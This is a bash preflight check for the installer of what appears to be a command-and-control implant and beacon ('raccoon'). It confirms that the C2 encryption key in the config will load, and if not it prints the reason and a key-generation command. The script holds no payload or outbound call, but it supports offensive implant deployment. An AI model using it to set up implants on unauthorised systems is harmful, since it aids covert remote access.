#!/bin/bash
# Preflight for install.sh: will the implant refuse to start with this config?
#
# raccoon-beacon.service sends its output to null, so a beacon that refuses to
# start for want of c2.encryption_key shows up only as "activating
# (auto-restart)" with no reason, every 90 seconds, forever. Asking before the
# units are enabled is the only place the operator is guaranteed to see it.
#
# Exit 0: the config is fine. Exit 1: it would be refused (the reason is
# printed). Exit 2: the check itself could not run. The reason is the same one
# the services give, because this calls the same load_config they do.
#
# The paths can be overridden for testing: RACCOON_ROOT, RACCOON_PYTHON,
# RACCOON_CONFIG.
set -u

ROOT="${RACCOON_ROOT:-/opt/raccoon}"
PYTHON="${RACCOON_PYTHON:-${ROOT}/venv/bin/python}"
CONFIG="${RACCOON_CONFIG:-${ROOT}/configs/raccoon.yaml}"
GENERATOR='python3 -c "import os,base64; print(base64.b64encode(os.urandom(32)).decode())"'

RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

if [ ! -x "$PYTHON" ] || [ ! -f "$CONFIG" ]; then
    echo -e "${YELLOW}[!] Could not check c2.encryption_key: need ${PYTHON} and ${CONFIG}.${NC}"
    echo -e "${YELLOW}    Run bootstrap.sh first, then set c2.encryption_key in ${CONFIG}.${NC}"
    exit 2
fi

# Only the lines load_config itself writes are shown: a failure to parse the
# file can quote a line of it, and that line may be the key.
OUT=$(cd "$ROOT" 2>/dev/null && PYTHONPATH="$ROOT" "$PYTHON" -c \
    'import sys; from software.main import load_config; load_config(sys.argv[1])' \
    "$CONFIG" 2>&1)
STATUS=$?

if [ "$STATUS" -eq 0 ]; then
    exit 0
fi

REASON=$(printf '%s\n' "$OUT" | grep '^Refusing to start:' | head -n 1)
if [ -z "$REASON" ]; then
    echo -e "${YELLOW}[!] Could not check c2.encryption_key (the check exited ${STATUS}).${NC}"
    echo -e "${YELLOW}    To see why: cd ${ROOT} && PYTHONPATH=${ROOT} ${PYTHON} -c 'from software.main import load_config; load_config(\"${CONFIG}\")'${NC}"
    exit 2
fi

echo ""
echo -e "${RED}============================================================${NC}"
echo -e "${RED}  WARNING: the implant will not start with this config${NC}"
echo -e "${RED}============================================================${NC}"
echo -e "${RED}  ${REASON}${NC}"
echo ""
echo -e "${YELLOW}  Set c2.encryption_key in ${CONFIG} (edit it with sudo) to the${NC}"
echo -e "${YELLOW}  same base64 key the team server runs with (--key). To make one:${NC}"
echo "    ${GENERATOR}"
echo ""
echo -e "${YELLOW}  Until then raccoon-implant exits and raccoon-beacon restarts every${NC}"
echo -e "${YELLOW}  90 seconds with no output: its logs go to /opt/raccoon/logs/beacon.log.${NC}"
echo -e "${RED}============================================================${NC}"
echo ""
exit 1
